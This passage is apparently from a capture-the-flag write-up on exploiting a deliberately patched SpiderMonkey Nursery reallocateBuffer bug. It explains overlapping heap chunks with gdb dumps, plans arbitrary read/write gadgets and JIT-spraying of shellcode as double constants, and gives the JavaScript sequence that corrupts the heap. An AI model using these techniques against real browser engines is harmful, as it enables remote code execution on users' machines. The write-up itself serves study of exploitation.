</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">gc</span><span class="o">-&gt;</span><span class="n">hasZealMode</span><span class="p">(</span><span class="n">ZealMode</span><span class="o">::</span><span class="n">CheckNursery</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">writeCanary</span><span class="p">(</span><span class="n">position</span><span class="p">()</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Canary</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">thing</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s check what is <code>position_</code> means</p>
<p><strong>Nursery.h</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="c1">// Pointer to the first unallocated byte in the nursery.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">uintptr_t</span> <span class="n">position_</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah, reading through those methods, we can deduce what this <code>allocateBuffer</code> do. So the summary is:</p>
<ul>
<li>Nursery heap has a pointer to the first unallocated byte called <code>position_</code></li>
<li>Everytime there is an allocation, the <code>allocate</code> will simply return the current <code>position_</code> address, and then shift the <code>position_</code> by n-size</li>
</ul>
<p>Turn out, the way Nursery heap do allocation is quite simple. Now, let&rsquo;s back to the <code>reallocateBuffer</code> method those were patched for this challenge, especially on the patched line of codes.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="kt">void</span><span class="o">*</span> <span class="n">newBuffer</span> <span class="o">=</span> <span class="n">allocateBuffer</span><span class="p">(</span><span class="n">zone</span><span class="p">,</span> <span class="n">newBytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// The nursery cannot make use of the returned slots data.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">newBytes</span> <span class="o">&lt;</span> <span class="n">oldBytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">position_</span> <span class="o">-=</span> <span class="n">oldBytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">oldBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The bug is there will be overlapping chunk after the call <code>reallocateBuffer</code>. For example:</p>
<ul>
<li>Suppose that <code>position_</code> is pointing to <code>x</code></li>
<li>And then you allocate <code>A</code> chunk with size 0x100
<ul>
<li><code>A</code> will point to <code>x</code></li>
<li><code>position_</code> will point to <code>x+0x100</code></li>
</ul>
</li>
<li>And then you allocate <code>B</code> chunk with size 0x30
<ul>
<li><code>B</code> will point to <code>x+0x100</code></li>
<li><code>position_</code> will point to <code>x+0x130</code></li>
</ul>
</li>
<li>And then let say you re-allocate <code>A</code> with size 0x20. Due to the bug, the <code>position_</code> will be corrupted. Below is the detail what happens:
<ul>
<li><code>reallocateBuffer</code> will allocate new chunk with size 0x20
<ul>
<li>Now, the <code>position_</code> will point to <code>x+0x150</code></li>
</ul>
</li>
<li>And then, because the <code>newBytes</code> is less than <code>oldBytes</code> (0x20 &lt; 0x100), position_ will point to <code>x+0x50</code>. Notes that the <code>position_</code> is messed up now.</li>
</ul>
</li>
<li>And then you allocate <code>C</code> chunk with size 0x100
<ul>
<li><code>C</code> will point to <code>x+0x50</code></li>
<li><code>position_</code> will now point to 0x150</li>
</ul>
</li>
<li>Now, <code>C</code> and <code>B</code> chunk is overlapping. If we able to do some write to the chunk <code>C</code>, we can forge the <code>B</code> chunk metadata.</li>
</ul>
<p>Now we found the bug, it&rsquo;s time for us to think more on how to create the exploitation plan</p>
<h3 id="exploitation-plan">Exploitation Plan</h3>
<p>Now we know the bug, we need to know three things before we can actually exploit the bug:</p>
<ul>
<li>How to trigger <code>allocateBuffer</code> in Nursery</li>
<li>What is the chunk metadata contents stored</li>
<li>How to trigger <code>reallocateBuffer</code> in Nursery</li>
</ul>
<h4 id="understanding-the-spidermonkey-engine">Understanding the SpiderMonkey engine</h4>
<p>Reading through this <a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener noreffer ">article</a> will help us to answer the first and third question. To trigger it, we actually can just create a new array object. For example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a = new Array(0x7e)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above LOC will call <code>allocateBuffer</code> in the process. To understand it better, let&rsquo;s fire up our gdb. Below is the script that I used to set the breakpoint.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b *js::Nursery::allocate+128
</span></span><span class="line"><span class="cl">b *js::Nursery::reallocateBuffer(JS::Zone*, js::gc::Cell*, void*, unsigned long, unsigned long)+643
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>The first breakpoint is pointing to the LOC <code>position_ = position() + size;</code> inside <code>allocate</code></li>
<li>The second is pointing to the LOC <code>position_ -= oldBytes</code> inside <code>reallocateBuffer</code></li>
</ul>
<p>Now, try to initialize array like above, and lookup at the gdb.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/4Y0mFOk.png"
        data-srcset="https://i.imgur.com/4Y0mFOk.png, https://i.imgur.com/4Y0mFOk.png 1.5x, https://i.imgur.com/4Y0mFOk.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/4Y0mFOk.png"
        title="https://i.imgur.com/4Y0mFOk.png" /></p>
<p>As you can see in the trace, it is true that creating an array array will call <code>js::Nursery::allocate</code>. The chunk address is the <code>$rax</code> value that you see in the above picture.</p>
<p>Stepping through the gdb, turn out during constructing an array with size 0x7e, it will allocate 3 times with respective size 0x30, 0x400, and 0x20 (To understand why the allocation is like that, I recommend you to read this <a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener noreffer ">article</a> which explain about it). Notes that these allocations size will varies based on your array size, which is why instead of calculating precisely, I&rsquo;ll just focus inspecting on the gdb layout.</p>
<p>Let&rsquo;s try to assign some value to our array.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a[0]=0x1337
</span></span><span class="line"><span class="cl">a[1]=2.4303e-320 // Double representation of 0x1337 hex
</span></span><span class="line"><span class="cl">a.x = 0xbeef
</span></span><span class="line"><span class="cl">a.y = 0x4141
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s inspect the chunk content now (start from the first one).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/50gx 0x1010a1c00690
</span></span><span class="line"><span class="cl">0x1010a1c00690: 0x00007ffff694e3f0      0x000010b870d60fe0
</span></span><span class="line"><span class="cl">0x1010a1c006a0: 0x00001010a1c009d0      0x00001010a1c006d0
</span></span><span class="line"><span class="cl">0x1010a1c006b0: 0x0000000000000000      0x0000007e00000000
</span></span><span class="line"><span class="cl">0x1010a1c006c0: 0x0000000200000000      0x0000007e00000005
</span></span><span class="line"><span class="cl">0x1010a1c006d0: 0xfff8800000001337      0x0000000000001337
</span></span><span class="line"><span class="cl">0x1010a1c006e0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c006f0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00700: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00710: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00720: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00730: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00740: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00750: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00760: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00770: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00780: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00790: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c007a0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c007b0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c007c0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c007d0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c007e0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c007f0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00800: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00810: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">gefâž¤  x/20gx 0x00001010a1c009d0
</span></span><span class="line"><span class="cl">0x1010a1c009d0: 0xfff880000000beef      0xfff8800000004141
</span></span><span class="line"><span class="cl">0x1010a1c009e0: 0x0000000000000000      0x00007ffff694e3f2
</span></span><span class="line"><span class="cl">0x1010a1c009f0: 0x0000000541410a50      0x0000003530373631
</span></span><span class="line"><span class="cl">0x1010a1c00a00: 0x0000000000000000      0x00007ffff694e3f2
</span></span><span class="line"><span class="cl">0x1010a1c00a10: 0x0000000413370a50      0x0000000039313934
</span></span><span class="line"><span class="cl">0x1010a1c00a20: 0x0000000000000000      0x00007ffff694e3f2
</span></span><span class="line"><span class="cl">0x1010a1c00a30: 0x0000000b00000250      0x2d65333033342e32
</span></span><span class="line"><span class="cl">0x1010a1c00a40: 0x0000000000303233      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00a50: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1010a1c00a60: 0x0000000000000000      0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Some notable metadata that we can see:</p>
<ul>
<li>At address <code>0x1010a1c006a0</code>, we can see that it stored a pointer to the start of our properties.</li>
<li>At address <code>0x1010a1c006a8</code>, we can see that it stored a pointer to the start of our array elements.</li>
<li>At address <code>0x1010a1c006c0</code>, it store the count of elements that we have stored in the array.</li>
<li>Starting from address <code>0x1010a1c006d0</code>, it contains our array elements value.</li>
<li>Starting from address <code>0x00001010a1c009d0</code>, it contains our properties values.</li>
</ul>
<p>If you notice, there is a MSBs set on our first array elements value, while the second element doesn&rsquo;t have any MSBs set. The first element MSBs is called an object tag. Refering to the source code of it in <a href="https://github.com/mozilla/gecko-dev/blob/master/js/public/Value.h" target="_blank" rel="noopener noreffer ">here</a>, to summarize it, every type in javascript has their own encoded tag set in the MSBs (Specifically 17-bits of their MSBs).</p>
<p>For example, as we can see in the GDB, for integer type, the MSBs that we saw is the integer tag, which is <code>0xffff8</code>. One of the unique type that doesn&rsquo;t have a tag is a Double (which is our second element), where it will use the whole address (8 bytes) to store the floating-point hex value representation of the Double.</p>
<p>Now we know about the metadata, our second question has been answered. Now, to answer the third question, as stated in the <a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener noreffer ">article</a>, if we set the array length to let say 0, it will trigger <code>reallocateBuffer</code>. Let&rsquo;s try this in our gdb by executing below code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.length=0
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/J59F5wF.png"
        data-srcset="https://i.imgur.com/J59F5wF.png, https://i.imgur.com/J59F5wF.png 1.5x, https://i.imgur.com/J59F5wF.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/J59F5wF.png"
        title="https://i.imgur.com/J59F5wF.png" /></p>
<p>As we can see in the above image, <code>reallocateBuffer</code> got triggered. Keep in mind that the bug is in this method, which mean after we set the array length, the Nursery pointer <code>position_</code> is now corrupted, and pointing to the wrong address.</p>
<h4 id="what-we-can-do-to-abuse-the-bug">What we can do to abuse the bug</h4>
<p>Keep in mind that from our first initial analysis, we actually can create an overlapping chunk with the bug. Usually, in order to exploit this kind of challenge, we need to be able:</p>
<ul>
<li>Read any value stored in any address</li>
<li>Write any value to any address</li>
</ul>
<p>How to achieve this? Based on the general knowledge on how the js engine works, we actually can abuse the overlapping chunk by creating an overlapping array, where the the array elements overlap with another array metadata, which mean we can achieve the above conditions.</p>
<p>Suppose that we have two array B and C, where due to the overlapping chunk bugs, one of the array B elements is actually pointing to the array C metadata stored pointer. For example, what we can do with this condition:</p>
<ul>
<li>Read any value stored in any address by:
<ul>
<li>Calculate the B array offset, so that when we overwrite the B array elements, it will actually rewrite the C metadata which stored the address of its starting element</li>
<li>Overwrite it with the address that we want</li>
<li>Now, if you access c[0], it will leak the address value.</li>
</ul>
</li>
<li>Write any value to any address by:
<ul>
<li>Calculate the B array offset, so that when we overwrite the B array elements, it will actually rewrite the C metadata which stored the address of its starting element</li>
<li>Overwrite it with the address that we targeted</li>
<li>Now, if you assign value to c[0], it will overwrite the address that we targeted</li>
</ul>
</li>
</ul>
<p>With this, now we can do anything, expanding this to:</p>
<ul>
<li>Read any object address</li>
<li>Overwrite any object metadata</li>
</ul>
<h4 id="jit-spray">JIT Spray</h4>
<p>Of course read and write to any address isn&rsquo;t enough to trigger RCE, so we need to expand this more. In order to do this, we will use JIT Spraying attack.</p>
<p>SpiderMonkey use IonMonkey as their JIT engine, where it is a whole-method JIT.</p>
<p>To summarize, if we have a method that is frequently called, IonMonkey will JIT-ed the method, which mean it will compile the method, and put it in the JIT-ed code address area.</p>
<p>And what JIT Spraying attack is basically trying to smuggle our shellcode to the JIT-ed code address area (which has r-x permission).</p>
<p>After reading some articles, we actually can create a function contains a lot of Double constants, and then create a loop to call this methods so many times. If the code got jit-ed, the JIT-ed code address area will contains our Double constants. For example, let say we have this code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sc</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sc_marker</span> <span class="o">=</span> <span class="mf">5.40900888</span><span class="nx">e</span><span class="o">-</span><span class="mi">315</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC1</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.827620262216015</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC2</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.82852429045179</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC3</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.82831220543336</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">sc</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our sc method will be jitted, and the double constant hex representation will be stored inside the jit-ed area also.</p>
<p>Now, we successfully smuggle a controllable 8-bytes hex in the <code>r-x</code> area, what if the constant is actually crafted, so that the hex representation is actually a shellcode, where each constants represent 8-bytes shellcode? That means if we can somehow overwrite the js engine return address to jump to our constants, we will gain RCE.</p>
<p>So, we will try to smuggle our shellcode to the jit-ed area, and then try to jump to it. The limitation is 8-bytes per constant.</p>
<h4 id="final-plan">Final Plan</h4>
<p>Gathering from all the above information, our plan will be:</p>
<ul>
<li>Trigger overlapping chunk bug, so that we have two array, where the first array&rsquo;s elements is actually pointing to the other metadata.</li>
<li>Create read and write gadget</li>
<li>Smuggle shellcode to the JIT-ed area</li>
<li>With our write gadget, overwrite the return address of the engine to jump to our smuggled shellcode.</li>
</ul>
<p>Now, let&rsquo;s move to the detailed of my solution.</p>
<h3 id="solution">Solution</h3>
<p>Below is the detailed step by step on how I craft my solution based on the final plan that I described before.</p>
<h4 id="trigger-overlapping-chunk">Trigger Overlapping chunk</h4>
<p>Let&rsquo;s restart our previous shell, and load this code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/* Sequence of operations to corrupt the Nursery Heap */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// NOTES:
</span></span></span><span class="line"><span class="cl"><span class="c1">// - The size that I choose is based on trial-and-error inspecting the GDB
</span></span></span><span class="line"><span class="cl"><span class="c1">// - Funny, but adding multiple line of comments also affect the nursery heap chunk layout. So I use inline comment to make sure my payload is working lol.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">)</span> <span class="c1">// This will initialize a-chunk inside the Nursery Heap. position_ (Nursery heap pointer to the first unallocated chunk) is still correct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1">// This will add a new chunk (b-chunk) after the a-chunk position_ is still correct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1">// This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of a-chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">b</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">// Fill b to increase the array b total element count, so that later we can write a value to any of b array elements.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1">// This will add a new chunk (c-chunk), which overlap a-chunk &amp; b-chunk. position_ will point to around b-chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="c1">// This will trigger reallocateBuffer (which is the bug).  After this, the position_ is corrupted, where it is now pointing to around the middle of b-chunk, specifically in the area of b-chunk array elements.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1">// This will add a new chunk (d-chunk), which overlap b-chunk. Now, this d array metadata is actually overlapping with the b array elements. Hence, with b, we can overwrite the metadata stored for array d.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">// Fill d to increase the array d total element count.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Assign 3 properties to d. This will be used during crafting addrof method
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">z</span> <span class="o">=</span> <span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on trial and error and inspecting the gdb, the above payload will trigger the overlapping chunk bug, where with <code>b</code>, we can overwrite the <code>d</code> metadata that stored pointers to its properties and elements address. You can read the code comments for summary on why it create an overlapping chunks.</p>
<p>So, inspecting via gdb, below is the current heap layout</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/50gx 0x1f4107200ae0
</span></span><span class="line"><span class="cl">0x1f4107200ae0: 0x00007ffff6951ff0      0x00003afd8a760f40
</span></span><span class="line"><span class="cl">0x1f4107200af0: 0x000055555700b9a8      0x00001f4107200b20
</span></span><span class="line"><span class="cl">0x1f4107200b00: 0x0000000000000000      0x0000005000000000
</span></span><span class="line"><span class="cl">0x1f4107200b10: 0x0000005000000000      0x0000005000000050
</span></span><span class="line"><span class="cl">0x1f4107200b20: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200b30: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200b40: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200b50: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200b60: 0xfff8800000000000      0x0000000e00000000
</span></span><span class="line"><span class="cl">0x1f4107200b70: 0x0000000e0000000e      0xfffb3afd8a761560
</span></span><span class="line"><span class="cl">0x1f4107200b80: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span class="line"><span class="cl">0x1f4107200b90: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span class="line"><span class="cl">0x1f4107200ba0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span class="line"><span class="cl">0x1f4107200bb0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span class="line"><span class="cl">0x1f4107200bc0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span class="line"><span class="cl">0x1f4107200bd0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span class="line"><span class="cl">0x1f4107200be0: 0xfffb3afd8a761560      0x00007ffff6951ff0
</span></span><span class="line"><span class="cl">0x1f4107200bf0: 0x00003afd8a765140      0x00001f4107200da0
</span></span><span class="line"><span class="cl">0x1f4107200c00: 0x00001f4107200c28      0x0000000000000000
</span></span><span class="line"><span class="cl">0x1f4107200c10: 0x0000002000000000      0x0000002000000000
</span></span><span class="line"><span class="cl">0x1f4107200c20: 0x0000002000000020      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200c30: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200c40: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200c50: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200c60: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">gefâž¤  x/10gx 0x00001f4107200da0
</span></span><span class="line"><span class="cl">0x1f4107200da0: 0x0000000000001337      0x0000000000001337
</span></span><span class="line"><span class="cl">0x1f4107200db0: 0x0000000000001337      0x00007ffff6951ff2
</span></span><span class="line"><span class="cl">0x1f4107200dc0: 0x0000000c00000250      0x3032373031346631
</span></span><span class="line"><span class="cl">0x1f4107200dd0: 0x0000000038656130      0x00007ffff6951ff2
</span></span><span class="line"><span class="cl">0x1f4107200de0: 0x0000000e00000250      0x3237303134663122
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes:</p>
<ul>
<li><code>0x1f4107200b20</code> is the starting of array B elements.</li>
<li><code>0x1f4107200bf8</code> is used by array D to store pointer to its properties (on <code>0x1f4107200da0</code>). Notice that b[27] is pointing to the same address.</li>
</ul>
<p>As you can see, the <code>d</code> stored pointer for properties (address <code>0x1f4107200bf8</code>) is actually overlapping with <code>b</code> 27th element. So, if we assign <code>b[27]</code> with a value, it will override the <code>d</code> properties stored pointer.</p>
<h4 id="create-read-and-write-gadget">Create Read and Write Gadget</h4>
<p>Before creating our read and write gadget, let&rsquo;s create some helper first to cast double and bigint easily. We will need this later.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
